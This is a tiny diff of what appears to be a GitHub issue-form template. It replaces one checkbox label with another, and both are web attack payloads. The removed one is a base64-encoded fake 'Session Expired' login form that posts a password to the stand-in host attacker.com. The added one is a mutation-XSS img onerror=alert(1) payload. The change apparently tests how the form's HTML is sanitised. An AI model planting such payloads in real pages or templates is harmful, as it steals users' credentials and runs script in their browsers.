@@ -6,4 +6,4 @@ body:
     attributes:
       label: Tests
       options:
-        - label: '<a href="data:text/html;base64,PGgxPlNlc3Npb24gRXhwaXJlZDwvaDE+PGZvcm0gYWN0aW9uPSJodHRwczovL2F0dGFja2VyLmNvbSI+PGlucHV0IG5hbWU9InBhc3MiIHBsYWNlaG9sZGVyPSJQYXNzd29yZCI+PGJ1dHRvbj5Mb2dpbjwvYnV0dG9uPjwvZm9ybT4=">Security Alert - Click Here</a>'
+        - label: '<math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></math>'
